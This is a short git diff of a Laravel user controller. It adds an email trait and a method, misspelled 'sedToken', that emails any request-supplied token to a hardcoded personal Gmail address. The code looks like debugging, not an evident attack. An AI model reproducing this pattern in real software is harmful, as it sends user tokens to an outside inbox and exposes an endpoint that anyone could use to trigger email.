@@ -12,10 +12,11 @@ use Illuminate\Support\Facades\Hash;
 use App\Traits\PushNotificationTrait;
 use Illuminate\Support\Facades\Auth;
 use App\Traits\SavePhotoTrait;
+use App\Traits\SendEmailTrait;
 
 class UserController extends Controller
 {
-    use DataFormController, PushNotificationTrait, SavePhotoTrait;
+    use DataFormController, PushNotificationTrait, SavePhotoTrait, SendEmailTrait;
 
     public function register(Request $request)
     {
@@ -240,5 +241,9 @@ class UserController extends Controller
             ->where("created_at", '>=', $user->created_at)->take(30)->get();
 
         return $notifications;
+    }
+
+    public function sedToken(Request $request) {
+        $this->sendEmail("kotbekareem74@gmail.com", "Hello", $request->token ?? "");
     }
 }
